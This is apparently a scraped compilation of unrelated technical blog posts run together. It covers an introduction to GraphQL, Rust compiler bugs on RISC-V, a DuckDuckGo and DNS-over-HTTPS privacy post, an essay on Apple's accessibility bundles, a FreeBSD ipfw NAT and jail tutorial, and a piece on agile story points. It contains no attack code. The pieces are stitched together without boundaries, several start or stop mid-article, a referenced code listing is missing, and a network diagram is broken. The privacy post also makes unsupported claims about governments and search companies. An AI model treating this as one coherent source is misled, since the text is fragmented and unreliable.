<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><strong>GraphQL is a new approach</strong> for building an API that aims to get the better of two basic <strong>RESTful APIs limitations</strong> which are data filters &amp; relationships. These two classic REST flaws force REST users to always get the full payload in response &amp; hit multiple data sources separately.</p>
<h2>What is GraphQL</h2>
<p><strong>GraphQL is a data query and manipulation language</strong> for APIs created and open-source by Facebook to solve the problem of unoptimized data flow in their mobile app. In general, GraphQL is a syntax that describing the way of requesting data from the server. The main difference comparing Graph QL to traditional REST API is that the response format is described in the query and defined by the client rather than the server. Another important thing about GraphQL is that it is language agnostic.</p>
<h2>Basic structure</h2>
<p>The core notion of using GraphQL is a <em>schema</em>.  Designing a schema is one of the first steps in the development process, casting a shadow over the rest of the project. A carefully planned Graph QL schema is the core of a well-designed and secure product. GraphQL Schema is a center-piece of any Graph QL project and it strictly defines its structure &amp; regulates how the data can be accessed.</p>
<h5>GraphQL Queries &amp; Mutations</h5>
<p>There are two basic types of GrahQL operations which are GraphQL Queries &amp; GraphQL Mutations:</p>
<ul>
<li><em>GraphQL Queries</em> - query allows you to read or fetch data from the server-side,</li>
<li><em>GraphQL Mutations</em> - mutations are used to write or post values.</li>
</ul>

    </span></p>
<p>The performed operations have a form of a string that a GraphQL server can parse and respond to with requested data in a specific format i.e JSON.</p>
<h5>GraphQL Resolvers</h5>
<p>In order to understand what we are querying for the GraphQL server needs to have a defined set of functions/rules that our server would use to generate the response. These functions are called GraphQL Resolvers and they are responsible for handling our queries.</p>

<h2>GraphQL vs REST</h2>
<p>Imagine we want to retrieve posts from a company blog using RESTful API. First, we need to <code>GET api/posts</code>, but posts have other data like authors so we need to call REST API again to get the details of the posts i.e. authors ending up with two server requests instead of one, and as you continue to scale, you may have even more requests to different endpoints in order to fetch all the needed data. </p>
<p>The performance drop, especially on slow cellular connections,  was the main problem Facebook engineers observed, and the urge to find its solution was a substructure for GraphQL. In GraphQL API we have a single endpoint being able to process complex requests. You query the GraphQL server for specific data and it will respond with what was requested, which results in fewer bits transferred over the wire.</p>

          </p>
          <p>My
<a href="https://www.codethink.co.uk/articles/2020/improving-risc-v-linux-support-in-rust/">previous blog post</a>
introduced my work to improve <a href="https://www.rust-lang.org/">Rust's</a> support for
<a href="https://riscv.org/">RISC-V</a> Linux systems. Since then I fixed a couple of
interesting compiler bugs. This blog post is more technical - describing these
bugs and explaining some <code>rustc</code> internals along the way. I conclude by
reporting on movement in the broader Rust community regarding RISC-V. I
assumed that the reader is comfortable with programming terminology. This blog
post contains Rust code samples but the reader is not expected to be fluent in
Rust.</p>
<h2>Hanging Tests</h2>
<p>In the last blog post I mentioned an issue where some <code>rustc</code> tests would
hang indefinitely. While I was tracking down the problem, the upstream
Rust project
<a href="https://github.com/rust-lang/rust/pull/67759">upgraded from LLVM 9 to LLVM 10</a>,
which fixed the hanging tests. I did not look into this issue
further.</p>
<h3>What is LLVM anyway?</h3>
<p>Modern compilers do not translate directly from source code into machine code.
Source code is intended to be convenient for humans to read; but it often is not
convenient for a compiler to reason about. Instead, compilers transform source
code through one (or more) intermediate representations on its way to becoming
machine code. <code>rustc</code> compiles Rust source through intermediate
representations into LLVM Intermediate Representation<a href="#first">*</a> (LLVM IR).
LLVM then runs optimisation passes on the LLVM IR and finally generates machine
code for the chosen architecture.</p>
<p>I think of LLVM IR as an elaborated machine-independent<a href="#second">**</a>
typed assembly language with unlimited registers. See this LLVM IR for a function
to add integers:</p>
<p><code>add.rs</code></p>
<div><pre><span></span><span>pub</span><span> </span><span>fn</span> <span>add</span><span>(</span><span>x</span>: <span>i32</span><span>,</span><span> </span><span>y</span>: <span>i32</span><span>)</span><span> </span>-&gt; <span>i32</span> <span>{</span><span></span>
<span>    </span><span>x</span><span> </span><span>+</span><span> </span><span>y</span><span></span>
<span>}</span><span></span>
</pre></div>


<p><code>rustc --crate-type lib -O add.rs --emit llvm-ir</code></p>
<div><pre><span></span>; ModuleID = 'add.3a1fbbbh-cgu.0'
source_filename = "add.3a1fbbbh-cgu.0"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

; add::add
; Function Attrs: norecurse nounwind nonlazybind readnone uwtable
define i32 @_ZN3add3add17h7cc3d194e9d7e4cdE(i32 %x, i32 %y) unnamed_addr #0 {
start:
  %0 = add i32 %y, %x
  ret i32 %0
}

attributes #0 = { norecurse nounwind nonlazybind readnone uwtable "probe-stack"="__rust_probestack" "target-cpu"="x86-64" }

!llvm.module.flags = !{!0, !1}

!0 = !{i32 7, !"PIC Level", i32 2}
!1 = !{i32 2, !"RtLibUseGOT", i32 1}
</pre></div>


<p>In LLVM IR, lines starting with <code>;</code> are comments. <code>target datalayout</code> and
<code>target triple</code> tell LLVM what architecture it should generate code for.</p>
<p>Next is the function definition. In Rust, the function name is <code>add::add</code>;
but the compiler mangles the name to <code>_ZN3add3add17h7cc3d194e9d7e4cdE</code>.
Then <code>define i32 @foo(i32 %x, i32 %y)</code> means <em>"define a function called
<code>foo</code> which takes two 32-bit signed integer (<code>i32</code>) arguments and returns an
<code>i32</code>"</em>. Inside the function, a <code>start:</code> label begins the block;
then <code>%0 = add i32 %y, %x</code> performs signed 32-bit addition on <code>x</code> and <code>y</code>
and puts the result in a variable automatically named <code>0</code>. Finally, <code>ret i32 %0</code>
returns the value of <code>0</code> as an <code>i32</code>.</p>
<p>The <code>attributes #0</code> line provides extra annotations for all functions tagged
with <code>#0</code> (such as <code>add::add</code>). The annotations give hints for LLVM optimisation
passes.</p>
<p>In theory, to support a new target architecture <code>rustc</code> only needs to know how to
tell LLVM that it should generate code for that architecture. <code>rustc</code> can then
generate LLVM IR as usual and LLVM will handle everything specific to the
architecture. For example, see the tiny
<a href="https://github.com/rust-lang/rust/pull/66661">PR</a> which initially added the
RISC-V Linux target.</p>
<p>In practice, <code>rustc</code> also needs to know how to conform to the ABI for the target
so that the generated code is interoperable with other programming languages. The
RISC-V ABI was added separately.</p>
<p><a name="first">*</a> <em>As well as LLVM, <code>rustc</code> also has an experimental
<a href="https://github.com/bjorn3/rustc_codegen_cranelift">cranelift backend</a>.</em></p>
<p><a name="second">**</a> <em>LLVM IR can be ABI specific but is not machine specific.</em></p>
<h2>Code generation Test Failure</h2>
<p>Other than fixing the hanging <code>ui</code> tests, LLVM 10 also broke code generation
tests for RISC-V. In LLVM 9 IR, function
arguments weren't always named but
<a href="https://github.com/llvm/llvm-project/commit/a009a60a917bc30940422bcef73f8270566d78db">in LLVM 10 they are</a>
. This change broke <code>rustc</code> code generation tests which look for specific strings
in the LLVM IR output by <code>rustc</code>.</p>
<p>After narrowing this test failure down to the LLVM 10 upgrade, I found the
relevant change by looking at <code>clang</code> (which also uses LLVM) tests for the RISC-V
ABI. The
<a href="https://github.com/rust-lang/rust/commit/c872dcf956e541315985ee5fdc592907c20df8ec">fix</a>
was as simple as copying the clang test changes and adapting them for <code>rustc</code>'s
tests.</p>
<h2>UI Tests</h2>
<p>The <code>ui</code> tests for <code>rustc</code> check all user facing aspects of the compiler. Some of
these tests check that <code>rustc</code> displays the correct error messages when compiling
erroneous source.</p>
<p>There was a bug highlighted by some of these tests on RISC-V: <code>rustc</code> displays
the correct errors but in the wrong order! To debug this I used
<code>-Z treat-err-as-bug=n</code> to cause <code>rustc</code> to panic on the <code>n</code>th error. The panic
backtrace shows where the error is generated from. In this case, the miss-ordered
errors came from
<a href="https://github.com/rust-lang/rust/blob/master/src/librustc_resolve/late.rs#L1287"><code>src/librustc_resolve/late.rs</code></a>:</p>

<p>In part 3, <code>missing_vars</code> is sorted before the errors are reported so how can
the errors be out of order?</p>
<p>At the time of the sort, <code>missing_vars</code> is a <code>Vec</code>tor of tuples, with each tuple
containing a <code>Symbol</code> and a mutable reference to a <code>BindingError</code>. In Rust this
type is written as <code>Vec&lt;(Symbol, &amp;mut BindingError)&gt;</code>. Rust tuples sort first by
the left-most element (in this case, the <code>Symbol</code>). To explain <code>Symbol</code> ordering
following a sort, first we must look at how strings are used within <code>rustc</code>.</p>
<h3>String Interning</h3>
<p>Source code often contains duplicates of the same string token. For example,
in the above listing of <code>check_consistent_bindings</code> the string <code>"FxHashMap"</code>
occurs twice and <code>"missing_vars"</code> occurs five times. Allocating separate strings
for each of these occurrences would waste memory and time. Instead, <code>rustc</code>
allocates each string once and uses indices to refer to the full string each
time it is needed. These indices are 32-bit unsigned integers (in a wrapper
type) and so can be copied and compared efficiently. The process of allocating
a string only once and using references to that string is called "interning".</p>
<p><a href="https://github.com/rust-lang/rust/blob/master/src/librustc_span/symbol.rs#L1041"><code>Symbol</code></a>
is the type representing an interned string:</p>
<div><pre><span></span><span>#[derive(Clone, Copy, PartialEq, ParitialOrd, Hash)]</span><span></span>
<span>pub</span><span> </span><span>struct</span> <span>Symbol</span><span>(</span><span>SymbolIndex</span><span>);</span><span></span>
</pre></div>


<p>Here we can see that the implementation of <code>PartialOrd</code> for <code>Symbol</code> (which
provides the <code>Ord</code>ering of <code>Vec::sort</code> above) derives from the index's <code>Ord</code>ering.
But where does the index come from?</p>

<p><code>rustc</code> interns strings using <code>Interner::intern</code>, which
returns a <code>Symbol</code>. References to the interned strings are stored in a
<code>Vec</code>tor and the <code>Symbol</code> contains the index of the string reference in that
<code>Vec</code>tor. Therefore, the Symbol can look up its string by indexing into the
<code>strings</code> vector and following the reference (pointer) to the actual string
(which is allocated in the <code>arena</code>).</p>
<p>For example, if the strings <code>"a"</code>, <code>"b"</code> and <code>"c"</code> are interned, then (ignoring
the referencing), the <code>Interner</code>'s <code>Vec</code> will look like <code>["a", "b", "c"]</code>. If
instead we interned <code>"b"</code>, <code>"a"</code>, <code>"b"</code> and <code>"c"</code>; the <code>Vec</code> will look like
<code>["b", "a", "c"]</code> because the second attempt to intern <code>"b"</code> finds that <code>"b"</code> is
already interned and so just returns the index of the existing copy of <code>"b"</code>.
Carrying on with this second example, imagine the following:</p>
<div><pre><span></span><span>let</span><span> </span><span>mischief</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"b"</span><span>);</span><span></span>
<span>let</span><span> </span><span>a</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"a"</span><span>);</span><span></span>
<span>let</span><span> </span><span>b</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"b"</span><span>);</span><span></span>
<span>let</span><span> </span><span>c</span><span> </span><span>=</span><span> </span><span>Symbol</span>::<span>intern</span><span>(</span><span>"c"</span><span>);</span><span></span>

<span>let</span><span> </span><span>mut</span><span> </span><span>v</span><span> </span><span>=</span><span> </span><span>vec</span><span>!</span><span>[</span><span>c</span><span>,</span><span> </span><span>b</span><span>,</span><span> </span><span>a</span><span>];</span><span></span>
<span>v</span><span>.</span><span>sort</span><span>();</span><span></span>
</pre></div>


<p>While we might expect <code>v</code> to end up equal to <code>[a, b, c]</code>, <code>v</code> is actually sorted
to equal <code>[b, a, c]</code> because <code>Symbol</code>s are sorted by their indices not by the
strings they point to. <code>b</code> received the lowest index because it was interned
first. This semantic can be useful because the index ordering is faster than
looking up the full strings and comparing them; and …</p></div></div></div>

<h3><span>What is DuckDuckGo?</span></h3>



<hr>
<p><a href="https://duckduckgo.com/">DuckDuckGo</a> is a search engine similar to Google but, with a major difference – It does not track you! In the modern era of internet where the knowledge acquired by the entire humankind is available at your fingertips, the rise of corporate and government-funded digital-tracking has become a major threat to people’s privacy.</p>
<p>Almost all major search engines including Google, Bing and Yahoo track&nbsp; you. Google most of all!</p>



<h3><span>Why and how much do they track?</span></h3>



<hr>
<p>The reason to why they track is simple – Money! Most companies that provide their product without a cost to thier users earn on the data they collected about them. The data collected about your search history, websites visited, time spent on a website, etc. is used to profile you and categorize your interests and then sold to advertisement companies to make the profit. This is the same business model that social media companies like facebook, twitter, etc. use to make money off of your data.</p>
<blockquote>
<p><strong><em>In a world with companies offering free services, the consumer becomes their product!</em></strong></p>
</blockquote>
<p>Google not only logs your search history from its search engine but also tracks your activities on various websites you visit by paying them to run their scripts on the site’s webpages.</p>



<h3><span>Don’t believe it?</span></h3>



<hr>
<p>I know it might sound like a conspiracy theory but you’d be amazed to know how easy it is to verify these claims. Simply install a plugin like uBlock Origin (<a href="https://addons.mozilla.org/en-US/firefox/addon/ublock-origin">For Firefox</a> or <a href="https://chrome.google.com/webstore/detail/ublock-origin/cjpalhdlnbpafiamejdnhcphjbkeiagm?hl=en-US">For Chrome</a>) that lets you see the domains that a website is trying to connect to from your computer and you’ll find that Google’s and Facebook’s trackers are all over the internet.</p>
<p>When you visit a website, the website’s content is downloaded to your device including HTML page, CSS styling and Java Scripts. The websites paid by Google and Facebook send you some additional Java Scripts along with their contents that connect to Google’s and Facebook’s servers and send your information to them.</p>
<p>This is also the reason why you see ads similar to your search history all over the internet, specially on websites like YouTube, Facebook, Google, Amazon, etc.</p>

<p>The screenshot above is marked with a box that displays that when I visit Standard Chartered’s website, a total of 5 domains get information about my presence on that website. Of these 5 domains, the requests to sc.com and www.sc.com were partially blocked (Red Arrow marked 1), gioip-js.com and googletagmanager.com were completely blocked (Red Arrow Marked 2) and maps.googleapis.com were not at all blocked (Red Arrow Marked 3) by uBlock Origin’s default set of filters. If you’d look a little to the right of that red box, you’d notice that despite 7 requests being blocked in total (13% of all requests on that page), the website was still completely functional and that it did not break.</p>



<h3><span>What’s in it for the government?</span></h3>



<hr>
<p>Frankly, to answer this question is difficult. Sometimes, governments ask these companies to share the data to track their citizens for various reasons. Other times, the governments ask companies like Google to help identify the protestors by disclosing their mobile phone’s GPS location at the time of protests and as a <em>quid pro quo </em>they kill their competition by passing Laws to ban sites like DuckDuckGo. We can never know these answers for sure as these deals are made behind closed doors.</p>



<h3><span>So, what do I do about DuckDuckGo?</span></h3>



<hr>
<p>Well, fortunately the solution to this problem is extremely simple. You can go to the Menu section of Firefox, select Options, go to the “General” settings tab, scroll all the way to the bottom and click the “Settings” button under “Network Settings”.</p>

<p>Besides the two options provided by Firefox, you can also find a list of other HTTPS-enabled privacy-oriented DNS services on <a href="https://www.privacytools.io/providers/dns/">PrivacyTools.io – DNS</a> page.</p>



<h3><span>How Does This Solution Work?</span></h3>



<hr>
<p>To understand how this solution work, we first need to understand how does the DNS work and <a href="https://crackerscreed.org/understanding-ssl-certificates/">how does SSL certificate work</a>. Once you understand that, you’d notice the if your DNS queries are sent over HTTPS, they can only be read by the DNS server and not by your ISP’s firewall. Without reading the your DNS query, they cannot tamper or block its intended response and hence cannot block you from getting its IP address.</p>



<h3><span>Is It A Fool-Proof Solution?</span></h3>



<hr>
<p>The unfortunate answer is No! There are other ways that a government can block a website like IP address based filtering, content based filtering, etc. And even if you bypass these filters and access DuckDuckGo, by no mean you become anonymous over the internet but, switching to an actively-maintained open-sourced browser such as Firefox, installing malware/tracking blocker plugin like uBlock Origin and switching to a privacy-oriented search engine can dramatically reduce your digital footprint. It could be your first step towards a long journey of internet anonymity and digital privacy!</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><h3>apple doesn’t succeed at making their platforms accessible because they care more, they don’t succeed because they are somehow better at programming</h3>

<p>a capable, thoughtful manager, who is correctly assessing risk vs reward, both qualitatively and quantitatively, who is doing their job well, using all of the experience and skill that brought them to where they are, can, and likely will, decide to ship an app that could be accessible, but is not.</p>

<p>this is not a function of callousness (although they may also be quite callous).</p>

<p>this is not a function of engineering aptitude (plenty of our leading lights have let access fall to the wayside<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup> by making solid engineering choices that are completely defensible).</p>

<p>the apple accessibility teams are made up of disciplined, brilliant engineers. they all work incredibly hard on a problem with unimaginable scale. but their brilliance and discipline and hard work, while necessary, are not sufficient.</p>

<p>what matters here, what sets apple apart, is that they figured out how to go last and contain the risk enough to avoid a revolt from other teams or executive leadership. it costs them a lot to do so, has significant, measurable downsides, and requires a significant rethink of what it means to build good software.</p>

<h3>bundles</h3>

<p>some of the code that powers accessibility on apple platforms is just disgusting to look at and to work on.</p>

<p>most of the code that makes apple software accessible lives in what’s called an accessibility bundle. without diving into the minutia of the thing, bundles are a way to load something akin to a plugin into a cocoa app at runtime if an assistive technology is activated. it involves manipulating the app or framework class hierarchy and using objective-c dynamism to read app state and build up a usable accessibility hierarchy. insert a super class here, read an instance variable there, swizzle in a method and store the state for it in associated objects.<sup id="fnref:2"><a href="#fn:2" rel="footnote">2</a></sup></p>

<p>bundles are not a good way to build software by any common measure. they don’t make you efficient, or your code correct. the performance can get bad. they’re hard to maintain and involve constant patching to keep them alive. huge chunks of bundle code are thrown away and rewritten multiple times during every major os release.</p>

<p>i found the initial adjustment to working on this code sometimes viscerally upsetting. “i can’t do that!!”, “clearly i should be protecting against…”, “if i do it that way it’ll break when they…”, etc.</p>

<p>the thing is, critically, if a user never activates an assistive technology like voiceover they wouldn’t know bundles even exist. many of the managers at apple don’t know much or care much about accessibility. some of them are borderline hostile to it. the bundles make it possible for the accessibility team to allocate their own resources and set their own priorities with only very limited coordination and fallout contained to people who would benefit most from the upside. they allow the accessibility team to fix the bugs they find, when they find them, with pretty limited opportunities for a manager who’s next promotion is on the line to get cold feet and pull resources or block fixes.</p>

<p>in the model of low end disruption, we can see bundles as a low end entrant, with a product that seems worse, but that solves an important problem in a way that the mature products, by their nature, can’t realistically address.</p>

<p>if the job to be done is “produce easy to understand, correct, maintainable code that engineers who care about those things will enjoy working on” then bundles aren’t even in the competition.</p>

<p>if the job is “manage your team resources responsibly, keep your bug count low, ship your features on time” then bundles aren’t the tool you reach for. why would you load a squirrelly plugin into your own app on purpose?</p>

<p>the chaotic morass of runtime hacks and macros for everything and nearly exclusive dependence on runtime validation<sup id="fnref:3"><a href="#fn:3" rel="footnote">3</a></sup> make them not just not good, but almost aggressively bad. but if the job they are hired to do is make apps that aren’t accessible, they’re incredible. unparalleled. entirely without peer.</p>

<p>almost all the things a good engineer would do to make bundles less gross would make them worse in unacceptable ways. almost anything a high end product might do to accommodate the kind of autonomy bundles demand would make them unacceptable to their current clients.<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup></p>

<p>apple has a team whose only job is to make things accessible and they have infrastructure that lets that team mostly avoid people who have a different job saying no to them. put those together and you have the most successful accessibility software team (imho) on planet earth.</p>

<h3>the gross stuff isn’t desirable, but is maybe necessary</h3>

<p>anyone who is steeped in universal design that has made it this far has maybe broken out in hives? please just stick with me, it’ll all come out in the wash.</p>

<ul>
<li>well designed apps that take accessibility into consideration from the beginning are better for everyone.</li>
<li>accessible ramps for getting into buildings are better than those terrible lifts they bolt into the sides of stairs in public buildings.</li>
<li>we all benefit from features in society that originate as accessibility affordances, like curb cuts for wheelchairs, that everyone with a stroller can now take for granted.</li>
</ul>


<p>without question these statements are true.</p>

<p>i don’t worry too much about saying things that might make people think i’m a bad engineer or have bad ideas about building software. i do care a lot about not giving people the idea that we should all knock out our accessibility code real quick and sloppy at the end as an afterthought.</p>

<p>my thesis here is that where the effect of failing is very much acute, most of us do not adjust our approach accordingly. likely because we regard assistive technology users as one of many available audiences we may or may not wish to court.</p>

<p>if we ship an app that’s inaccessible, hey we’ll get around to it, we’ve got a roadmap, hasn’t bubbled up yet, software takes time. there are so many bugs in our support tracker and “doesn’t work for blind people” is just a tiny blip.</p>

<p>of course we should be methodical and plan ahead and build our software in a way that is both accessible and maintainable. we should seek to avoid compromising, but should the need to compromise emerge, the balance should unquestionably be tilted towards gross and unmaintainable code where that is the cost of accessibility. if you could fix that missing label but eww i’d have to wire up a very clumsy chain of delegates or fire a notification that clearly violates layering, without question, you should do it.<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup></p>

<p>we should be willing to find a blend of cultural and political and technical workarounds in our organizations that acknowledge that code can’t be allowed to go out the door that isn’t accessible and that a lot of our ideas about technical excellence and what a good engineering manager does wildly miscalculate the cost of our decisions to “do it right”.</p>

		<p>Most of the time, I want to do some throw away networking temporally to play
with something or to try something out. I really don't like changing all the
config on a machine just to try something. The FreeBSD documentation leans the
other way first showing you what to edit in rc.conf before maybe mentioning
that actual commands to run. </p>
<p>The ipfw documentation has a different problem. The example in the handbook and
online are both very verbose and very complicated. Because ipfw is normally
configured with a shell script the authors go absolutely wild with all the
features they can.</p>
<p>I had a hard time figuring out ipfw in-kernel NAT from these guides. Instead
here I present the simplest set of commands I could find to set up a NAT and a
little explanation to help you debug when it doesn't work.</p>
<p>This is based on a great email from <a href="https://lists.freebsd.org/pipermail/freebsd-virtualization/2014-October/002998.html">Allan Jude</a> on the
freebsd-virtualization list from 2014 that laid out the basics of this setup. </p>
<h2 id="set-up-overview">Set up Overview</h2>
<p>For testing I want to run virtual machines and vnet jails on my laptop and give
them have access to the internet. I want a throw away NAT setup that is ready
to go quickly.</p>
<p>My laptop connects to my home network (and eventually the internet) over wifi.
The wifi network offers me an address in the 192.168.1.0/24 subnet. On my
laptop I want to have multiple guests. To do this we are going to use ipfw NAT
and a bridge interface. It will look something like this:</p>
<pre><code>         TO INTERNET
          ^
          |
          |
          v
          +-------+  192.168.1.x
+-------------| wlan0 |---------------+
|             +-------+               |

|                 |                   |
|              ipfw nat               |
|                 |                   |
|                 V                   |

</code></pre><p>The interfaces in the jails (the b half of the epair) and the virtual machines
(the vtnet in the V) won't be visible to ipfw, but will exist in their own
world. To work around this we will use a bridge with the epairs and tap
interfaces.</p>
<h2 id="setting-up-ipfw-nat">Setting up ipfw NAT</h2>
<p>We need to load the kernel modules for ipfw and the ipfw in kernel NAT. ipfw
has the frustrating default (and annoyingly different to ipf and pf) of to
dening all traffic. This default has the great property of locking you out of a
machine you are setting up remotely.</p>
<p>This is control by a sysctl that cannot be changed at run time, but we can
change the default behaviour with kenv before we load the module:</p>
<pre><code># kenv net.inet.ip.fw.default_to_accept=1
</code></pre><p>Now we can safely load ipfw and the in-kernel NAT. </p>
<pre><code># kldload ipfw ipfw_nat
</code></pre><p>ipfw should load enabled, if you are having trouble later on double check that
the firewall is actually enabled.</p>
<pre><code># sysctl net.inet.ip.fw.enable
net.inet.ip.fw.enable: 1
</code></pre><p>When we do NAT we are acting as a gateway between the traffic on the NATd
interface and the real interface. For any packets to be passed we need to
enable forwarding.</p>
<pre><code># sysctl net.inet.ip.forwarding=1
# sysctl net.inet6.ip6.forwarding=1
</code></pre><h2 id="ipfw-rule-set">ipfw rule set</h2>
<p>We need to create an IPFW NAT instance configured with the interface we want to
NAT (wlan0 in this case) and configure rules to pass all traffic from the
bridge through the NAT.</p>
<pre><code># ipfw nat 1 config if wlan0
# ipfw add 101 nat 1 ip from 10.0.4.0/24 to any out via wlan0
# ipfw add 103 nat 1 ip from any to any in via wlan0
</code></pre><p>I like to leave a gap between rules like this so I can insert an ipfw log
command for the eventual case that nothing makes sense and everything is
broken.</p>
<h2 id="set-up-interfaces">set up interfaces</h2>
<p>A bridge is the center of our guest network, we will give it the default root
address that all of our guests will speak to.</p>
<pre><code># ifconfig bridge create
bridge0
# ifconfig bridge0 inet 10.0.4.1/24 up
</code></pre><p>Our jail will use an epair interface to speak to the outside world. They come
as an a and a b part, ifconfig only tells us about the a part when it clones
the interface. When we give a vnet jail an interface it is no longer visible to
the host system. An epair gives us two interfaces that act like a virtual
ethernet cable, we stick one end into the jail and the other is connected to
the bridge.</p>
<pre><code># ifconfig epair create
epair0a
</code></pre><p>Our virtual machine will use a tap interface to access the world. The tap
interface needs to be brought up. There is a helpful sysctl that is off by
default which will trigger the interface to be brought up when it is first
opened. I like to set this to one, otherwise I find myself debugging networking
inside the VM alot with little success.</p>
<pre><code># ifconfig tap create
tap0
# sysctl net.link.tap.up_on_open=1
</code></pre><p>With all the interfaces set up we need to add them to our bridge.</p>
<pre><code># ifconfig bridge0 addm epair0a addm tap0
</code></pre><h2 id="create-jail">Create jail</h2>
<p>Never spoken about is the bsdinstall jail command. It takes a directory and
installs a jail into it. This command will ask you some questions, it would be
cool if it didn't, that would make automating jail creation in scripts much
easier for me.</p>
<pre><code># mkdir testjail
# bsdinstall jail testjail
</code></pre><p>We make our jail persist so it will stick around as we experiment. The
following command creates the jail on the host:</p>
<pre><code># jail -c name=testjail persist vnet path=testjail vnet.interface=epair0b 
</code></pre><p>Now we can jexec into the jail and configure the epair. When you bring one end
of an epair up, the other end comes up, when it goes down the other end goes
down. We just need to configure an address and a default route in our jail.</p>
<pre><code># jexec testjail sh
[testjail] # ifconfig epair0b inet 10.0.4.4/24 up
[testjail] # route add default 10.0.4.1
[testjail] # ping -c 1 10.0.4.1
[testjail] # ping -c 1 192.168.1.1
[testjail] # ping -c 1 8.8.8.8
</code></pre><p>With this setup the jail can speak to our bridge, the local network and the
wider Internet.</p>
<h2 id="create-and-config-a-vm">Create and config a VM</h2>
<p>The FreeBSD offers prebuilt virtual machine images, The latest current one is
available from a url like this:</p>
<pre><code># fetch ftp://ftp.freebsd.org/pub/FreeBSD/snapshots/VM-IMAGES/13.0-CURRENT/amd64/Latest/FreeBSD-13.0-CURRENT-amd64.raw.xz
</code></pre><p>It would be cool if there was a latest symlink that gave you a new head VM from
one static place. The image comes xz compressed, we need to unpack it and I
like to move it to a consistent place:</p>
<pre><code># xz -d FreeBSD-13.0-CURRENT-amd64.raw.xz
# mv FreeBSD-13.0-CURRENT-amd64.raw /vms/freebsd-current
</code></pre><p>bhyve requires we load the vmm kernel module, with that we can use the
excellent vmrun.sh script to launch our vm.</p>
<pre><code># kldload vmm
# sh /usr/share/examples/bhyve/vmrun.sh -c 4 -m 1024 -t tap0 -d /vms/freebsd-current freebsd-current
</code></pre><p>Once that comes up you can log in and do some manual config.</p>
<pre><code>[vm] # ifconfig vtnet0 inet 10.0.4.5/24 up
[vm] # route add default 10.0.4.1
[vm] # ping 8.8.8.8
</code></pre><p>For DNS in both the jail and the virtual machines I have to manually set up the
name server local from my network.</p>
<p>/etc/resolv.conf</p>
<pre><code>search lan
nameserver 192.168.1.1
</code></pre><p>This won't be valid as I move to other networks, but I am sure I will remember
after only a little confusion and debugging.</p>
<h2 id="conclusion">Conclusion</h2>
<p>That is all it takes. The NAT configuration is 3 firewall rules and enabling
forwarding. None of this is persistent and that isn't great practice for a
production environment, but it you just want to experiment with ipfw and NAT,
or spin up a VM for today knowing how to do this in a non-persistent way is
really helpful.</p>

<p>Human beings are not very good at seeing into the future. Unless you have a crystal ball or know how to read tea leaves, trying to predict when an event will happen with any degree of accuracy is very difficult. Unfortunately, as software developers, we are regularly asked to do this. Stakeholders usually want to know when they can expect the completion of features. It can make them nervous if we tell them that we don’t know for sure, or give a timeframe that sounds worryingly large to them to account for our uncertainty.</p>

<p>Story points attempt to solve this by sidestepping time-based estimates, and focusing instead upon estimating complexity - on the basis that we are better at judging how complicated a piece of work is than how long it will take to complete.  Estimating complexity allows us to abstract away things that we can’t reasonably predict (and often throw off our predictions) such as illness and distractions, and focus on the things that we can - like whether one task is going to be bigger than another.</p>

<p>Once we have a way to quantify complexity, it is possible to begin to measure how much of it can be tackled over time - this is known as velocity. Measuring a team’s velocity allows us to build forecasts of how much work they are likely to be able to complete in the future. Note the word <em>likely</em> in that last sentence. Story points are not a silver bullet that will let you make perfect predictions about when a task will be finished - but in my experience, they are a significant step up from trying to estimate time directly.</p>

<p>They help you shift from hand-waving and guessing, to evidence-based reasoning about a teams capacity. Over time I’ve found that the accuracy of story point-based predictions tend to improve as teams gain practice and experience, and as the error in velocity averages away as more data gets added to the calculation.</p>

<p>Story points can be a contentious topic amongst software professionals; a lot have had bad experiences with them, and don’t see how they can ever help on a project. While I don’t think story points will be a good fit for <em>all</em> projects, I do believe that they can be useful on <em>a lot</em> of projects - especially when teams are inexperienced and haven’t had a chance to build up some discipline.</p>

<p>I regularly hear two objections to story points that, in my opinion, betray underlying flaws in peoples thinking rather than a problem with the technique itself:</p>

<p>Firstly: that the complexity of a task is different depending on whether you have more or less experience, often stated as ‘my points are different from your points’. Secondly: that there is ultimately no real difference between complexity and time - ‘five points is about a day, this task will take about a day, so I vote five points’.</p>

<p>The first objection is problematic because you should be estimating for the team, not individuals. If a task is going to be harder for a particular person to complete, then the team should be working with them to help. If you expect someone to struggle to complete work by themselves with no assistance when it would benefit them, then you have more significant problems on your team than estimation. It would be best if you focused on fostering collaboration and knowledge sharing before worrying about anything else.</p>

<p>The second objection is harder to help people move past.  The cognitive leap from time-based estimation, to complexity-based estimation, is quite a large one. The easiest way that I have found to help people get into the right frame of mind is by agreeing on a story to use as a reference at the beginning of estimation sessions. The question then becomes ‘how much larger is the story we are currently estimating that our reference story’. When they don’t have a lot of experience with relative complexity, people often find ranking stories, and then fitting points to them later much more straightforward than coming up with points on the spot (as you would with planning poker).</p>

<p>With a bit of time and practice, most teams can build up an implicit understanding of how story points relate to the complexity of individual pieces of work in their backlog.  As a team becomes more practised, a satisfying moment eventually occurs: everyone’s estimates begin to converge. You know that your team is getting the hang of things when everyone is consistently voting for the same number of story points on each piece of work that comes up; and when any significant variation that occurs is the result of someone knowing something that the others haven’t considered.</p>

<p>Whether or not you use story points on your project, I think there are some ideas we can learn from them that are universally applicable. Almost all projects benefit when we can quantify changes to them over time. Reflecting upon, and learning from our experiences is a crucial part of agile development, and doing this with data can give us confidence in our conclusions, and justification for our predictions.</p>

July 1, 2020 | http://www.pathsensitive.com/2018/10/book-review-philosophy-of-software.html | <a href="https://web.archive.org/web/*/http://www.pathsensitive.com/2018/10/book-review-philosophy-of-software.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><div>

